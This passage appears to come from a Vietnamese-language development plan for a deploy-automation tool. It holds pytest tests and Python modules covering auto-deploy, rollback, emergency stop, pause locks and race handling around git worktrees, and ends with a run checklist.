    def buoc(self, bat_ghi: bool | None = None) -> dict:
        if bat_ghi is not None:
            self.bg = bat_ghi
        return buoc_deploy(self.bo, self.kho, self.da, bat_ghi=lambda ten: self.bg)

    def sk(self, loai: str) -> list[dict]:
        return [json.loads(d) for (d,) in self.kho.db.execute(
            "SELECT du_lieu FROM su_kien WHERE loai = ? ORDER BY id", (loai,))]

    def ss(self) -> list[tuple]:
        return [(x["commit"], x["so_merge"], len(x["bao_gom"])) for x in self.sk("deploy.san_sang")]

    def ban(self) -> str | None:
        f = self.g / "ban"
        return f.read_text().strip() if f.exists() else None

    def hong(self, buoc: str, co: bool = True) -> None:
        f = self.g / CO_HONG[buoc]
        f.touch() if co else f.unlink(missing_ok=True)


def va(monkeypatch, ten: str, boc) -> None:
    """Bọc hàm `ten` ở mọi module `tram.deploy.*` đang giữ tên đó — chèn việc đúng bước dù hàm nằm ở module nào."""
    for m in [m for k, m in list(sys.modules.items()) if k.startswith("tram.deploy.") and hasattr(m, ten)]:
        monkeypatch.setattr(m, ten, boc(getattr(m, ten)))


def mot_lan(lam):
    """Bọc: lần gọi ĐẦU TIÊN chạy `lam()` trước rồi mới gọi hàm thật."""
    da = []

    def boc(goc):
        def ham(*a, **kw):
            if not da:
                da.append(lam())
            return goc(*a, **kw)
        return ham
    return boc, da


def song(pid: int) -> bool:
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    return True


@pytest.fixture
def t(tmp_path):
    tr = Tram(tmp_path)
    yield tr
    tr.kho.close()


def test_tu_merge_tu_deploy_tat_thi_san_sang_mot_lan(t):
    """Scenario "Tự merge xong, tự deploy tắt": sẵn sàng deploy, không chạy lệnh nào; không báo lặp mỗi vòng."""
    m = t.merge()
    assert t.buoc() == {"san_sang_deploy": 1}
    (s,) = t.sk("deploy.san_sang")
    assert (s["commit"], s["so_merge"], len(s["bao_gom"]), s["cho"]) == (m, 1, 1, ["tu_deploy_tat"]) and not t.ban()
    assert t.buoc() == {} and len(t.sk("deploy.san_sang")) == 1
    m2 = t.merge(tu=False)                                          # Scenario "Đại ca gộp tay" (D96)
    assert t.buoc() == {"san_sang_deploy": 1} and t.ss()[-1] == (m2, 2, 2)


def test_thieu_lenh_hoac_chi_quet_thu_khong_bao(tmp_path):
    tr = Tram(tmp_path, du_lenh=False)
    tr.merge()
    assert tr.buoc() == {} and tr.buoc(bat_ghi=False) == {} and tr.sk("deploy.san_sang") == []
    tr.kho.close()


def test_tu_deploy_sau_tu_merge_dat(tmp_path):
    """Scenario "Tự deploy sau tự merge": deploy rồi kiểm còn sống trong bản sạch; xong thì xoá bản sạch."""
    tr = Tram(tmp_path, tu_deploy=True)
    m = tr.merge()
    assert tr.buoc() == {"deploy_dat": 1} and tr.ban() == m
    (bd,) = tr.sk("deploy.bat_dau")
    assert (bd["commit"], bd["commit_truoc"], bd["nguon"]) == (m, "", "tu_dong") and bd["ma_thao_tac"].startswith("dp-")
    assert len(bd["bao_gom"]) == 1 and "yeu_cau" not in bd
    assert [x["buoc"] for x in tr.sk("deploy.lenh")] == ["deploy", "kiem_song"]
    assert tr.sk("deploy.xong") == [{"ma_thao_tac": bd["ma_thao_tac"], "ket_qua": "dat", "dem_hong": 0}]
    assert not (tram_home() / "kho-deploy" / "repo-nhap").exists() and tr.sk("deploy.san_sang") == []
    log = tram_home() / "deploy-log" / "repo-nhap" / f"{bd['ma_thao_tac']}.log"
    assert (tmp_path / "pwd").read_text().strip() == str((tram_home() / "kho-deploy" / "repo-nhap").resolve())
    assert stat.S_IMODE(log.stat().st_mode) == 0o600 and log.read_text().startswith("=== deploy\n")
    assert tr.buoc() == {}
    tr.kho.close()


def test_hong_thi_tu_lui_ve_ban_truoc_ba_lan_thi_tu_tat(tmp_path):
    """Scenario "Lùi thành công", "Lần hỏng thứ ba": tự lùi về bản trước; hỏng 3 lần liên tiếp → tự tắt; D124: bản
    hỏng không tự chạy lại; merge sau quay về "sẵn sàng deploy" gồm mọi bản chưa lên."""
    tr = Tram(tmp_path, tu_deploy=True)
    m1 = tr.merge()
    assert tr.buoc() == {"deploy_dat": 1}
    tr.hong("deploy")
    for lan in (1, 2, 3):
        tr.merge()
        assert tr.buoc() == {"deploy_da_lui": 1} and tr.ban() == m1
        assert tr.sk("deploy.xong")[-1]["dem_hong"] == lan and tr.sk("deploy.bat_dau")[-1]["commit_truoc"] == m1
    assert doc_trang_thai(tr.kho.db, "repo-nhap").cai_dat.tu_deploy is False
    assert tr.buoc() == {}                                          # bản hỏng không tự chạy lại
    m5 = tr.merge()
    assert tr.buoc() == {"san_sang_deploy": 1} and tr.ss()[-1] == (m5, 4, 4)
    tr.kho.close()


def test_lui_hong_thi_tam_dung_du_an(tmp_path):
    """Scenario "Trang chết sau lùi": tắt tự deploy, tạm dừng dự án; merge sau chỉ "sẵn sàng"."""
    tr = Tram(tmp_path, tu_deploy=True)
    tr.hong("kiem_song")
    tr.merge()
    assert tr.buoc() == {"deploy_lui_hong": 1}
    assert [x["buoc"] for x in tr.sk("deploy.lenh")] == ["deploy", "kiem_song", "lui", "kiem_song_sau_lui"]
    tt = doc_trang_thai(tr.kho.db, "repo-nhap")
    assert tt.cai_dat.tu_deploy is False and tt.tam_dung_du_an.ly_do == "lui-hong"
    tr.merge()
    assert tr.buoc() == {"san_sang_deploy": 1} and len(tr.sk("deploy.bat_dau")) == 1
    tr.kho.close()


def test_tam_dung_chan_tu_deploy_nhung_deploy_tay_duoc(tmp_path):
    """Scenario "Deploy tay khi dự án tạm dừng" (D97 luật 3); "Tạm dừng rồi tiếp tục"."""
    tr = Tram(tmp_path, tu_deploy=True)
    ghi_tam_dung(tr.kho.db, "repo-nhap", tam_dung=True, tac_nhan=DAI_CA)
    m = tr.merge()
    assert tr.buoc() == {"san_sang_deploy": 1} and tr.ban() is None
    tr.bam(m)
    assert tr.buoc() == {"deploy_dat": 1} and tr.ban() == m and tr.sk("deploy.bat_dau")[0]["nguon"] == "dai_ca"
    assert tr.sk("deploy.bat_dau")[0]["yeu_cau"] == "ma-dp-0001"
    ghi_tam_dung(tr.kho.db, "repo-nhap", tam_dung=False, tac_nhan=DAI_CA)
    m2 = tr.merge()
    assert tr.buoc() == {"deploy_dat": 1} and tr.ban() == m2       # sau Tiếp tục: tự deploy chạy lại
    tr.kho.close()


def test_tam_dung_roi_tiep_tuc_van_tu_deploy_ban_tu_merge(tmp_path):
    """Codex Q8: tự merge xong lúc dự án đang TẠM DỪNG → hàng "sẵn sàng"; Tiếp tục → tự deploy bản đó (khác D123)."""
    tr = Tram(tmp_path, tu_deploy=True)
    ghi_tam_dung(tr.kho.db, "repo-nhap", tam_dung=True, tac_nhan=DAI_CA)
    m = tr.merge()
    assert tr.buoc() == {"san_sang_deploy": 1} and tr.sk("deploy.san_sang")[0]["cho"] == ["tam_dung_du_an"]
    ghi_tam_dung(tr.kho.db, "repo-nhap", tam_dung=False, tac_nhan=DAI_CA)
    assert tr.buoc() == {"deploy_dat": 1} and tr.ban() == m and tr.sk("deploy.bat_dau")[0]["nguon"] == "tu_dong"
    tr.kho.close()


def test_san_sang_truoc_khi_bat_tu_deploy_thi_cho_bam(t):
    """D123: bản đã "sẵn sàng" TRƯỚC khi Đại ca bật tự deploy → không tự deploy, chờ bấm; tự merge SAU đó mới tự
    deploy (đem đỉnh nhánh chính, gồm cả bản đang chờ)."""
    t.merge()
    assert t.buoc() == {"san_sang_deploy": 1}
    doi_cai_dat(t.kho.db, "repo-nhap", lambda c: CaiDatTuDong(**{**c.__dict__, "tu_deploy": True}), tac_nhan=DAI_CA)
    assert t.buoc() == {} and t.ban() is None
    m2 = t.merge()
    assert t.buoc() == {"deploy_dat": 1} and t.ban() == m2 and len(t.sk("deploy.bat_dau")[0]["bao_gom"]) == 2


def test_estop_huy_nut_deploy_dang_cho_khong_chay(t):
    """INV-004: estop bật → không chạy gì; nút Deploy bấm trước đó không tự chạy sau khi tắt estop."""
    m = t.merge()
    t.bam(m, "ma-dp-0002")
    estop.bat("thử")
    assert t.buoc() == {"deploy_huy": 1} and t.sk("deploy.huy") == [
        {"ma_thao_tac": "ma-dp-0002", "commit": m, "ly_do": "estop"}]
    estop.tat()
    assert t.buoc() == {"san_sang_deploy": 1} and t.ban() is None


@pytest.mark.parametrize("bat_ghi, commit, ly_do", [(False, None, "bat_ghi"), (True, "f" * 40, "commit_khong_co")])
def test_nut_deploy_bi_huy_khi_vong_xet_lai(t, bat_ghi, commit, ly_do):
    """D116: `bat_ghi: false` không Deploy tay — vòng deploy xét lại khoá chung ngay trước chuỗi."""
    m = t.merge()
    t.bam(commit or m, "ma-dp-0003")
    assert t.buoc(bat_ghi=bat_ghi) == {"deploy_huy": 1} and t.sk("deploy.huy")[0]["ly_do"] == ly_do
    assert t.ban() is None and t.sk("deploy.bat_dau") == []


def test_nut_deploy_ban_cu_bi_huy_truoc_khoi_chay(t):
    """Codex Q7: Đại ca bấm Deploy cho m5, rồi m6 merge trước khi vòng deploy nhận → KHÔNG chạy m5 lặng lẽ: huỷ
    `ban_moi_hon` (lịch sử "Deploy bị huỷ"), vòng sau báo "sẵn sàng" bản m6 gồm cả m5."""
    m5 = t.merge()
    assert t.buoc() == {"san_sang_deploy": 1}
    t.bam(m5, "ma-dp-0004")
    m6 = t.merge(tu=False)
    assert t.buoc() == {"deploy_huy": 1} and t.ban() is None and t.sk("deploy.bat_dau") == []
    assert t.sk("deploy.huy") == [{"ma_thao_tac": "ma-dp-0004", "commit": m5, "ly_do": "ban_moi_hon"}]
    assert t.buoc() == {"san_sang_deploy": 1} and t.ss()[-1] == (m6, 2, 2)


@pytest.mark.parametrize("doi, tay, ly_do", [("tam_dung", False, None), ("tam_dung_tram", False, None),
                                             ("tu_deploy_tat", False, None), ("estop", True, "estop"),
                                             ("bat_ghi", True, "bat_ghi")])
def test_cua_tuoi_doc_lai_khoa_ngay_truoc_lenh_dau(tmp_path, monkeypatch, doi, tay, ly_do):
    """Codex Q4: Đại ca đổi khoá TRONG LÚC trạm dựng bản sạch → chuỗi KHÔNG bắt đầu, không lệnh nào chạy; nút Deploy
    bị huỷ kèm lý do; tự deploy hoãn, kích còn nguyên — mở khoá lại thì vòng sau chạy (D97: đã bắt đầu mới làm nốt)."""
    tr = Tram(tmp_path, tu_deploy=True)
    db = tr.kho.db

    def tu_deploy(bat: bool):
        return lambda: doi_cai_dat(db, "repo-nhap", lambda c: CaiDatTuDong(**{**c.__dict__, "tu_deploy": bat}),
                                   tac_nhan=DAI_CA)
    doi_khoa = {"tam_dung": (lambda: ghi_tam_dung(db, "repo-nhap", tam_dung=True, tac_nhan=DAI_CA),
                             lambda: ghi_tam_dung(db, "repo-nhap", tam_dung=False, tac_nhan=DAI_CA)),
                "tam_dung_tram": (lambda: ghi_tam_dung(db, DU_AN_TRAM, tam_dung=True, tac_nhan=DAI_CA),
                                  lambda: ghi_tam_dung(db, DU_AN_TRAM, tam_dung=False, tac_nhan=DAI_CA)),
                "tu_deploy_tat": (tu_deploy(False), tu_deploy(True)),
                "estop": (lambda: estop.bat("thử"), estop.tat),
                "bat_ghi": (lambda: setattr(tr, "bg", False), lambda: setattr(tr, "bg", True))}[doi]
    m = tr.merge()
    if tay:
        tr.bam(m)
    boc, da = mot_lan(doi_khoa[0])
    va(monkeypatch, "tao_worktree", boc)
    kq = tr.buoc()
    assert da and tr.ban() is None and tr.sk("deploy.bat_dau") == [] and tr.sk("deploy.lenh") == []
    assert kq == ({"deploy_huy": 1} if tay else {"deploy_hoan": 1})
    assert [x["ly_do"] for x in tr.sk("deploy.huy")] == ([ly_do] if tay else [])
    doi_khoa[1]()
    if not tay:
        assert tr.buoc() == {"deploy_dat": 1} and tr.ban() == m
    tr.kho.close()


def test_merge_ghi_trong_luc_tao_worktree_khong_bi_coi_la_da_deploy(tmp_path, monkeypatch):
    """Codex Q6: trong lúc dựng bản sạch cho m5, m6 được merge và ghi `pr.da_merge` (kho kiểm chưa fetch) → chuỗi
    m5 bị hoãn vì remote đã đổi; lượt sau deploy m6 gồm cả hai merge, không mất trigger m6."""
    tr = Tram(tmp_path, tu_deploy=True)
    m5 = tr.merge()
    boc, moi = mot_lan(lambda: tr.merge(fetch_kho=False))
    va(monkeypatch, "tao_worktree", boc)
    assert tr.buoc() == {"deploy_hoan": 1} and tr.ban() is None
    assert tr.sk("deploy.bat_dau") == []
    fetch(tr.k.kho)
    assert tr.buoc() == {"deploy_dat": 1} and tr.ban() == moi[0]
    assert [len(x["bao_gom"]) for x in tr.sk("deploy.bat_dau")] == [2]
    tr.kho.close()


def test_merge_va_fetch_trong_luc_tao_worktree_thi_hoan_deploy_ban_moi_nhat(tmp_path, monkeypatch):
    """D97 luật 5 + Codex Q6: đỉnh nhánh chính đổi trong lúc chuẩn bị → không chạy bản đã cũ; lượt sau deploy MỘT lần
    bản mới nhất, gồm cả m5."""
    tr = Tram(tmp_path, tu_deploy=True)
    tr.merge()
    boc, moi = mot_lan(tr.merge)
    va(monkeypatch, "tao_worktree", boc)
    assert tr.buoc() == {"deploy_hoan": 1} and tr.ban() is None and tr.sk("deploy.bat_dau") == []
    assert tr.buoc() == {"deploy_dat": 1} and tr.ban() == moi[0] and len(tr.sk("deploy.bat_dau")[0]["bao_gom"]) == 2
    tr.kho.close()


@pytest.mark.parametrize("treo, sau_chuoi", [("worktree add", False), ("rev-parse", False), ("merge-base", False),
                                             ("worktree remove", True)])
def test_git_chuan_bi_hay_don_treo_thi_dung_trong_han(tmp_path, monkeypatch, treo, sau_chuoi):
    """Codex Q5: một lời gọi git chuẩn bị/dọn treo → vòng deploy kết thúc trong hạn `HAN["git"]`, tiến trình git bị
    thu hồi, có trạng thái: treo trước `bat_dau` → chưa ghi gì, đếm `deploy_chuan_bi_loi`; treo lúc dọn sau chuỗi →
    kết quả chuỗi đã ghi giữ nguyên."""
    monkeypatch.setitem(HAN, "git", 2)
    tr = Tram(tmp_path, tu_deploy=True)
    m = tr.merge()
    bin_, pid, co = tmp_path / "bin-treo", tmp_path / "git-treo.pid", tmp_path / "git-treo.co"
    bin_.mkdir()
    (bin_ / "git").write_text(f'#!/bin/sh\ncase "$*" in *"{treo}"*) [ -f "{co}" ] && echo $$ > "{pid}" &&'
                              f' exec /bin/sleep 20;; esac\nexec {shlex.quote(shutil.which("git"))} "$@"\n')
    (bin_ / "git").chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_}:{os.environ['PATH']}")
    if sau_chuoi:
        va(monkeypatch, "chay_buoc", lambda goc: lambda *a, **kw: (co.touch(), goc(*a, **kw))[1])
    else:
        co.touch()
    bat_dau = time.monotonic()
    kq = tr.buoc()
    assert time.monotonic() - bat_dau < 15 and pid.exists()
    het = time.monotonic() + 5
    while song(int(pid.read_text())) and time.monotonic() < het:
        time.sleep(0.1)
    assert not song(int(pid.read_text()))
    if sau_chuoi:
        assert kq == {"deploy_dat": 1} and tr.ban() == m and tr.sk("deploy.xong")[0]["ket_qua"] == "dat"
    else:
        assert kq == {"deploy_chuan_bi_loi": 1} and tr.sk("deploy.bat_dau") == [] and tr.ban() is None
    tr.kho.close()


def test_mat_dien_giua_deploy_khong_ro_khong_chay_lai(tmp_path):
    """Scenario "Mất điện giữa deploy" + D115: ghi "không rõ", tạm dừng cả dự án, không lệnh nào chạy lại."""
    tr = Tram(tmp_path, tu_deploy=True)
    m = tr.merge()
    tr.ghi("deploy.bat_dau", {"ma_thao_tac": "dp-cu", "commit": m, "commit_truoc": "", "nguon": "tu_dong",
                              "bao_gom": [2]}, tac_nhan="tram/tu-deploy")
    assert tr.buoc() == {"deploy_khong_ro": 1} and tr.ban() is None
    assert tr.sk("deploy.xong") == [{"ma_thao_tac": "dp-cu", "ket_qua": "khong_ro", "dem_hong": 0}]
    assert doc_trang_thai(tr.kho.db, "repo-nhap").tam_dung_du_an.ly_do == "khong-ro"
    assert tr.buoc() == {} and tr.ban() is None and len(tr.sk("deploy.bat_dau")) == 1
    tr.kho.close()


def test_merge_moi_trong_luc_deploy_cho_luot_sau(tmp_path, monkeypatch):
    """Scenario "Merge mới trong lúc đang deploy": chuỗi đang chạy làm nốt; bản mới deploy ở lượt sau."""
    tr = Tram(tmp_path, tu_deploy=True)
    m1 = tr.merge()
    boc, moi = mot_lan(tr.merge)
    va(monkeypatch, "chay_buoc", boc)
    assert tr.buoc() == {"deploy_dat": 1} and tr.ban() == m1
    assert tr.buoc() == {"deploy_dat": 1} and tr.ban() == moi[0]
    assert [x["commit_truoc"] for x in tr.sk("deploy.bat_dau")] == ["", m1]
    tr.kho.close()


def test_lenh_treo_qua_han_thi_lui(tmp_path, monkeypatch):
    """Scenario "Lệnh deploy treo" (hạn rút ngắn): dừng lệnh, tính hỏng, chuyển sang lùi."""
    monkeypatch.setitem(HAN, "deploy", 1)
    tr = Tram(tmp_path, tu_deploy=True)
    f = tmp_path / "tram-deploy" / "deploy.sh"
    f.write_text("#!/bin/sh\n/bin/sleep 30\n")
    tr.merge()
    assert tr.buoc() == {"deploy_da_lui": 1}
    d = tr.sk("deploy.lenh")[0]
    assert (d["buoc"], d["het_gio"], d["ma_thoat"] != 0, d["giay"] < 15) == ("deploy", True, True, True)
    assert [x["buoc"] for x in tr.sk("deploy.lenh")] == ["deploy", "lui", "kiem_song_sau_lui"]
    tr.kho.close()


def test_khong_co_kho_kiem_thi_khong_lam_gi(t):
    t.merge()
    t.bo.kho_git = lambda d: None
    assert t.buoc() == {} and t.sk("deploy.san_sang") == []
```

### File `tests/test_deploy_race.py`

```python
"""Q4/Q6/Q8: kiểm điều phối bằng biên git và runner GIẢ; không chứng minh thu hồi OS (G8 riêng)."""
import shlex
import subprocess
from pathlib import Path

import pytest

from test_deploy_vong import (
    test_cua_tuoi_doc_lai_khoa_ngay_truoc_lenh_dau,
    test_merge_ghi_trong_luc_tao_worktree_khong_bi_coi_la_da_deploy,
    test_merge_va_fetch_trong_luc_tao_worktree_thi_hoan_deploy_ban_moi_nhat,
    test_tam_dung_roi_tiep_tuc_van_tu_deploy_ban_tu_merge,
)
from tram.deploy.lenh import KetQuaBuoc


@pytest.fixture(autouse=True)
def bien_gia(monkeypatch):
    def git(argv, *, kill, timeout, **kw):
        return subprocess.run(argv, timeout=timeout, **kw)
    def lenh(buoc, lenh, *, cwd, env, log):
        if buoc == "deploy":
            goc = Path(shlex.split(lenh)[1]).parent.parent
            (goc / "ban").write_text(env["TRAM_DEPLOY_COMMIT"])
        return KetQuaBuoc(buoc, 0, 0, False, "sha256:gia")
    monkeypatch.setattr("tram.deploy.git.chay_gioi_han", git)
    monkeypatch.setattr("tram.deploy.chay.chay_buoc", lenh)
```

### File `tests/test_deploy_cong_tac_v2.py`

```python
"""V2-Q2/D123: chuỗi công tắc trên kho sự kiện thật, runner/Git có hạn giả (không chứng minh OS)."""
from dataclasses import replace

import pytest

from test_deploy_race import bien_gia
from test_deploy_vong import DAI_CA, Tram, mot_lan, va
from tram.deploy.trang_thai import doc_su_kien, tu_merge_cho_deploy
from tram.tu_dong.luu import doi_cai_dat, ghi_tam_dung


@pytest.mark.parametrize("tat, nhip_khi_tat", [(True, True), (True, False), (False, False)])
def test_v2_q2_san_sang_tam_dung_roi_doi_cong_tac(tmp_path, tat, nhip_khi_tat):
    tr = Tram(tmp_path, tu_deploy=True)
    try:
        ghi_tam_dung(tr.kho.db, tr.da.ten, tam_dung=True, tac_nhan=DAI_CA)
        commit = tr.merge()
        assert tr.buoc() == {"san_sang_deploy": 1}
        assert tr.buoc() == {}
        assert len(tr.sk("deploy.san_sang")) == 1
        if tat:
            doi_cai_dat(tr.kho.db, tr.da.ten, lambda c: replace(c, tu_deploy=False), tac_nhan=DAI_CA)
            if nhip_khi_tat:
                assert tr.buoc() == {"san_sang_deploy": 1}
                assert "tu_deploy_tat" in tr.sk("deploy.san_sang")[-1]["cho"]
                for _ in range(3):
                    assert tr.buoc() == {}
                assert len(tr.sk("deploy.san_sang")) == 2
            doi_cai_dat(tr.kho.db, tr.da.ten, lambda c: replace(c, tu_deploy=True), tac_nhan=DAI_CA)
        ghi_tam_dung(tr.kho.db, tr.da.ten, tam_dung=False, tac_nhan=DAI_CA)
        tr.buoc()
        for _ in range(3):
            assert tr.buoc() == {}
        assert len(tr.sk("deploy.bat_dau")) == (0 if tat else 1)
        assert tr.ban() == (None if tat else commit)
        assert tu_merge_cho_deploy(doc_su_kien(tr.kho.db, tr.da.ten)) is None
        if tat:
            tr.bam(commit)
            assert tr.buoc() == {"deploy_dat": 1}
            assert tr.buoc() == {}
            assert len(tr.sk("deploy.bat_dau")) == 1
            assert tr.sk("deploy.bat_dau")[0]["nguon"] == "dai_ca"
    finally:
        tr.kho.close()
```

Thêm vào cùng `tests/test_deploy_cong_tac_v2.py` (V3-Q2, trước sửa cửa bắt đầu):

```python
@pytest.mark.parametrize("tat", [True, False])
def test_doi_cong_tac_khi_chuan_bi_phai_xet_lai_trigger(tmp_path, monkeypatch, tat):
    tr = Tram(tmp_path, tu_deploy=True)
    try:
        db, ten = tr.kho.db, tr.da.ten
        ghi_tam_dung(db, ten, tam_dung=True, tac_nhan=DAI_CA)
        commit = tr.merge()
        assert tr.buoc() == {"san_sang_deploy": 1}
        ghi_tam_dung(db, ten, tam_dung=False, tac_nhan=DAI_CA)

        def doi():
            if tat:
                doi_cai_dat(db, ten, lambda c: replace(c, tu_deploy=False), tac_nhan=DAI_CA)
                doi_cai_dat(db, ten, lambda c: replace(c, tu_deploy=True), tac_nhan=DAI_CA)

        boc, da = mot_lan(doi)
        va(monkeypatch, "tao_worktree", boc)
        assert tr.buoc() == ({"deploy_hoan": 1} if tat else {"deploy_dat": 1})
        assert da and len(tr.sk("deploy.bat_dau")) == (0 if tat else 1)
        assert len(tr.sk("deploy.lenh")) == (0 if tat else 2)
        if tat:
            assert tr.buoc() == {}                 # không tự thử lại bản đã chờ trước lần bật
            tr.bam(commit)
            assert tr.buoc() == {"deploy_dat": 1}   # quyền bấm tay vẫn giữ
        assert tr.buoc() == {}
        assert len(tr.sk("deploy.bat_dau")) == 1
    finally:
        tr.kho.close()
```

Suy luận đỏ: trước sửa, nhánh `tat=True` trả `deploy_dat` vì chỉ đọc bool cuối cùng là True.
Sau sửa, xét lại trigger theo lịch sử ngay sau chuẩn bị; đối chứng không đổi công tắc vẫn deploy.
Test dùng `bien_gia` cùng file, chưa được reviewer chạy.

### File `tram/deploy/git.py`

```python
"""Git chuẩn bị/dọn deploy: tất cả lời gọi có hạn và thu hồi nhóm P1, không lưu output."""
import os
import shutil
from pathlib import Path

from tram.deploy.lenh import HAN
from tram.kiem.chay_gioi_han import chay_gioi_han
from tram.kiem.vong_doi import kill_cuc_bo


def _git(repo, *args, check=True):
    return chay_gioi_han(["git", "-c", "core.hooksPath=/dev/null", "-C", str(repo), *args],
                         kill=kill_cuc_bo, timeout=HAN["git"], capture_output=True, check=check,
                         env={**os.environ, "GIT_TERMINAL_PROMPT": "0"})


def sha_cua(repo, ref):
    kq = _git(repo, "rev-parse", "--verify", "--quiet", f"{ref}^{{commit}}", check=False)
    return kq.stdout.decode().strip() if kq.returncode == 0 else None


def la_to_tien(repo, a, b):
    return _git(repo, "merge-base", "--is-ancestor", a, b, check=False).returncode == 0


def tao_worktree(repo: Path, dich: Path, commit: str):
    xoa_worktree(repo, dich)
    dich.parent.mkdir(parents=True, exist_ok=True)
    _git(repo, "worktree", "add", "--detach", "--quiet", str(dich), commit)


def xoa_worktree(repo: Path, dich: Path):
    try:
        _git(repo, "worktree", "remove", "--force", str(dich), check=False)
    finally:
        shutil.rmtree(dich, ignore_errors=True)
    _git(repo, "worktree", "prune", check=False)


def dinh_hien_tai(repo, nhanh):
    kq = _git(repo, "ls-remote", "--exit-code", "origin", f"refs/heads/{nhanh}")
    dong = kq.stdout.decode().splitlines()
    return dong[0].split()[0] if len(dong) == 1 else None
```

### File `tram/deploy/chay.py`

```python
"""Chuẩn bị bản sạch, kiểm tươi sát lúc bắt đầu, ghi đúng tập commit được bao phủ."""
import os
import subprocess

from tram.chu import estop
from tram.deploy.chuoi import chay_chuoi
from tram.deploy.ghi import ghi, ket_thuc, ma_chuoi
from tram.deploy.git import dinh_hien_tai, la_to_tien, sha_cua, tao_worktree, xoa_worktree
from tram.deploy.lenh import chay_buoc, don_log_cu, moi_truong, thu_muc_log
from tram.deploy.trang_thai import commit_truoc, doc_su_kien, ma, merge_chua_deploy
from tram.deploy.trang_thai import tu_merge_cho_deploy
from tram.duong_dan import tram_home
from tram.tu_dong.khoa import ly_do_chan
from tram.tu_dong.luu import doc_trang_thai


def huy(db, ten, yc, ly):
    ghi(db, ten, "deploy.huy", {"ma_thao_tac": ma(yc), "commit": yc.du_lieu.get("commit"), "ly_do": ly})
    return "deploy_huy"


def phu(kg, ds, commit):
    return [s.id for s in merge_chua_deploy(ds) if la_to_tien(kg, s.du_lieu["merge_commit"], commit)]


def chuoi(db, kg, da, commit, nguon, ma_yc, bat_ghi, yc=None):
    m = ma_chuoi(da.ten, commit, nguon, ma_yc)
    ds = doc_su_kien(db, da.ten)
    if any(s.loai == "deploy.bat_dau" and ma(s) == m for s in ds):
        return "deploy_da_co"
    wt, truoc = tram_home() / "kho-deploy" / da.ten, commit_truoc(ds)
    try:
        # Chụp tập phủ trước tạo worktree. Merge ghi sau đó không bị tiêu thụ bởi mốc sự kiện.
        bao = phu(kg, ds, commit)
        tao_worktree(kg, wt, commit)
        dinh = dinh_hien_tai(kg, da.nhanh_chinh)
        if yc is None:
            tm = tu_merge_cho_deploy(doc_su_kien(db, da.ten), ma_nguon=ma_yc)
            if tm is None:
                return "deploy_hoan"             # D123: trigger có thể bị tiêu trong lúc chuẩn bị
        tt = doc_trang_thai(db, da.ten)
        ly = ly_do_chan(tt, viec="deploy_tay" if yc else "deploy", bat_ghi=bat_ghi(da.ten),
                       estop_bat=estop.dang_bat())
        if ly or dinh != commit:
            return huy(db, da.ten, yc, ly[0] if ly else "ban_moi_hon") if yc else "deploy_hoan"
        ghi(db, da.ten, "deploy.bat_dau", {"ma_thao_tac": m, "commit": commit, "commit_truoc": truoc,
                                          "nguon": nguon, "bao_gom": bao, "yeu_cau": ma(yc) if yc else None})
        thu_muc = thu_muc_log(da.ten)
        don_log_cu(thu_muc)
        env = moi_truong(os.environ, da.ten, commit, truoc)
        def chay(buoc, lenh):
            kq = chay_buoc(buoc, lenh, cwd=wt, env=env, log=thu_muc / f"{m}.log")
            ghi(db, da.ten, "deploy.lenh", {"ma_thao_tac": m, **kq.su_kien()})
            return kq
        ket_qua = chay_chuoi(tt.cai_dat, chay)
        ket_thuc(db, da.ten, m, ket_qua)
        return f"deploy_{ket_qua}"
    finally:
        try:
            xoa_worktree(kg, wt)
        except (OSError, subprocess.SubprocessError):
            ghi(db, da.ten, "deploy.don_loi", {"ma_thao_tac": m})
```

### File `tram/deploy/vong.py`

```python
"""Pha deploy riêng: đối soát, yêu cầu tay, trigger tự động; trước chuỗi đọc lại khoá."""
import subprocess
from collections import Counter

import yaml

from tram.cau_hinh.bat_ghi import bat_ghi as doc_bat_ghi
from tram.chu import estop
from tram.deploy.chay import chuoi, huy, phu
from tram.deploy.ghi import ghi, ket_thuc
from tram.deploy.git import sha_cua
from tram.deploy.trang_thai import (chuoi_dang_do, da_ghi_nhan, doc_su_kien, ma, merge_chua_deploy,
                                    tu_merge_cho_deploy, yeu_cau_cho)
from tram.tu_dong.khoa import ly_do_chan
from tram.tu_dong.luu import doc_trang_thai


def bat_ghi_an_toan(ten):
    try:
        return doc_bat_ghi(ten)
    except (OSError, ValueError, AttributeError, yaml.YAMLError):
        return False


def _buoc(bo, kho, da, bat_ghi, dem):
    db = kho.db
    for bd in chuoi_dang_do(doc_su_kien(db, da.ten)):
        ket_thuc(db, da.ten, ma(bd), "khong_ro")
        dem["deploy_khong_ro"] += 1
    ds = doc_su_kien(db, da.ten)
    yc = yeu_cau_cho(ds)
    if estop.dang_bat():
        if yc:
            dem[huy(db, da.ten, yc, "estop")] += 1
        return
    if (kg := bo.kho_git(da)) is None:
        return
    tt = doc_trang_thai(db, da.ten)
    ly = ly_do_chan(tt, viec="deploy_tay" if yc else "deploy", bat_ghi=bat_ghi(da.ten), estop_bat=False)
    if yc and ly:
        dem[huy(db, da.ten, yc, ly[0])] += 1
        return
    tm, gom = tu_merge_cho_deploy(ds), merge_chua_deploy(ds)
    if not yc and not (gom and bat_ghi(da.ten) and tt.cai_dat.du_lenh):
        return
    dinh = sha_cua(kg, f"origin/{da.nhanh_chinh}")
    if not dinh:
        return
    if yc:
        c = yc.du_lieu.get("commit", "")
        if c != dinh:
            ly = "ban_moi_hon" if sha_cua(kg, c) else "commit_khong_co"
            dem[huy(db, da.ten, yc, ly)] += 1
        else:
            dem[chuoi(db, kg, da, c, "dai_ca", ma(yc), bat_ghi, yc)] += 1
    elif tm and not ly:
        dem[chuoi(db, kg, da, dinh, "tu_dong", f"sk-{tm.id}", bat_ghi)] += 1
    else:
        bao = phu(kg, ds, dinh)
        if bao and not da_ghi_nhan(ds, dinh, bao, cho=ly):
            ghi(db, da.ten, "deploy.san_sang", {"commit": dinh, "so_merge": len(bao), "bao_gom": bao, "cho": ly})
            dem["san_sang_deploy"] += 1


def buoc_deploy(bo, kho, da, *, bat_ghi=bat_ghi_an_toan):
    dem = Counter()
    try:
        _buoc(bo, kho, da, bat_ghi, dem)
    except (OSError, subprocess.SubprocessError):
        dem["deploy_chuan_bi_loi"] += 1
    return dict(dem)
```

- [ ] Áp mã, chạy xanh; lưu số đo thật, không dùng số dự kiến.

```bash
tests/chan_host/chay.sh -q tests/test_deploy_vong.py tests/test_deploy_race.py tests/test_deploy_cong_tac_v2.py
```

- [ ] Kiểm diff và trần dòng; giữ thay đổi chưa commit.

